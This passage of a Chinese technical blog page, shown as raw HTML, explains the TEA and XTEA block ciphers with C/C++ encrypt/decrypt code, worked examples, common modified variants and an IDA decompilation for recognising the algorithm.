operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// 初始化参数   </span>    <span class="token keyword">uint32_t</span> sum <span class="token operator">=</span> num_rounds <span class="token operator">*</span> DELTA<span class="token punctuation">;</span>   <span class="token comment">// 初始sum为delta*加密轮数, 如果dalta为0x9e3779b9，加密32轮，则这个值为0xC6EF3720  </span>    <span class="token keyword">uint32_t</span> k0 <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k1 <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k2 <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k3 <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// key值  </span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_rounds<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 一般为32轮解密  </span>        v1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k2<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k3<span class="token punctuation">)</span><span class="token punctuation">;</span>          v0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k1<span class="token punctuation">)</span><span class="token punctuation">;</span>          sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例一</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span> <span class="token number">0xFACEB00C</span><span class="token punctuation">,</span> <span class="token number">0xDAC0FFEE</span><span class="token punctuation">,</span> <span class="token number">0xABADBABE</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x11111111</span><span class="token punctuation">,</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> <span class="token number">0x33333333</span><span class="token punctuation">,</span> <span class="token number">0x44444444</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>   <span class="token comment">// 轮数</span>    <span class="token keyword">int</span> data_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// data 的长度</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment">// 2 个 4 字节为一组</span>        <span class="token function">tea_encrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后：0x%x 0x%x 0x%x 0x%x \n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment">// 2 个 4 字节为一组</span>        <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后：0x%x 0x%x 0x%x 0x%x \n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 输出：加密后：0x99ad7ec2 0x938c4882 0x10ad3961 0xe971209e 解密后：0xdeadbeef 0xfaceb00c 0xdac0ffee 0xabadbabe */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例二</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"password123456789"</span><span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x11111111</span><span class="token punctuation">,</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> <span class="token number">0x33333333</span><span class="token punctuation">,</span> <span class="token number">0x44444444</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>   <span class="token comment">// 轮数</span>    <span class="token keyword">int</span> data_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// data 的长度</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>   <span class="token comment">// 8 字节为一组</span>        <span class="token function">tea_encrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后：%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>   <span class="token comment">// 8 字节为一组</span>        <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后：%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 输出：加密后：(乱码)解密后：password123456789*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>TEA 算法可能的魔改：</p><ol><li>修改 delta 值，不再为 0x9e3779b9 或者 0x61c88647</li><li>修改加密过程，在每一轮迭代中增加可逆运算，例如加上一个 <code>^ (sum + i)</code>：</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_rounds<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 一般为 32 轮加密  </span>sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>  v0 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k2<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k3<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么解密时，则修改为：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_rounds<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 一般为32轮解密</span>v1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k2<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k3<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> <span class="token punctuation">(</span>num_rounds <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> v0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> <span class="token punctuation">(</span>num_rounds <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>在最后赋值时，添加可逆运算：</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0 <span class="token operator">^</span> <span class="token number">0x12</span><span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1 <span class="token operator">^</span> <span class="token number">0x34</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><hr><h2 id="IDA-示例-2"><a href="#IDA-示例-2" class="headerlink" title="IDA 示例"></a>IDA 示例</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">tea_encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-1Ch]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-14h]</span>  v4 <span class="token operator">=</span> <span class="token operator">*</span>a2<span class="token punctuation">;</span>  v5 <span class="token operator">=</span> a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> a1 <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v6 <span class="token operator">-=</span> <span class="token number">1640531527</span><span class="token punctuation">;</span>   <span class="token comment">// 即：0x61C88647</span>    v4 <span class="token operator">+=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v5 <span class="token operator">+</span> <span class="token operator">*</span>a3<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v5 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> a3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v5 <span class="token operator">+=</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v4 <span class="token operator">+</span> a3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v4 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> a3<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> v4<span class="token punctuation">;</span>  result <span class="token operator">=</span> v5<span class="token punctuation">;</span>  a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h1><blockquote><p>由于 TEA 算法被发现存在缺陷，作为回应，设计者提出了一个 TEA 的升级版本——XTEA</p><p>XTEA 是 TEA 的扩展，也称做 TEAN，它使用与 TEA 相同的简单运算，同样是一个 64 位块的 Feistel 密码，使用 128 位密钥，建议 64 轮，但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击</p></blockquote><h2 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a>特点</h2><ol><li><p>基本上 TEA 的加密特点 XTEA 也都有，例如：存在 DELTA 值</p></li><li><p>同样，涉及到的移位操作通常是左移 4 位、右移 5 位；不同的是，对于 <code>sum</code> 的累加或累减操作位于 <code>v0</code>、<code>v1</code> 两个数据处理之间</p></li><li><p><mark>与 TEA 不同的是，在 XTEA 中密钥 key 的下标是通过计算得来的</mark>，分别是 <code>key[sum &amp; 3]</code> 和 <code>key[(sum &gt;&gt; 11) &amp; 3]</code></p></li></ol><hr><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>与 TEA 的思想基本类似，对于密钥 key 的取法与 TEA 有所不同</p><p>加密流程如图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%814.png" alt="加密算法的函数特征4.png"></p><hr><h2 id="加解密代码-3"><a href="#加解密代码-3" class="headerlink" title="加解密代码"></a>加解密代码</h2><h3 id="C-版-1"><a href="#C-版-1" class="headerlink" title="C++ 版"></a>C++ 版</h3><ul><li><p><strong>特点</strong></p><ol><li>包含具体实现流程</li><li>支持快速修改加密轮数 <code>num_rounds</code> 和 <code>delta</code> 的值</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span>   </span><span class="token comment">// DELTA值  </span></span><span class="token comment">//加密函数</span><span class="token keyword">void</span> <span class="token function">xtea_encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span>v <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token class-name">uint32_t</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_rounds<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          v0 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>          v1 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//解密函数</span><span class="token keyword">void</span> <span class="token function">xtea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token class-name">uint32_t</span> sum <span class="token operator">=</span> DELTA <span class="token operator">*</span> num_rounds<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_rounds<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          v1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>          v0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例一</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">uint32_t</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>              <span class="token number">0x168F8672</span><span class="token punctuation">,</span> <span class="token number">0x02DBD824</span><span class="token punctuation">,</span> <span class="token number">0xCF647FCA</span><span class="token punctuation">,</span> <span class="token 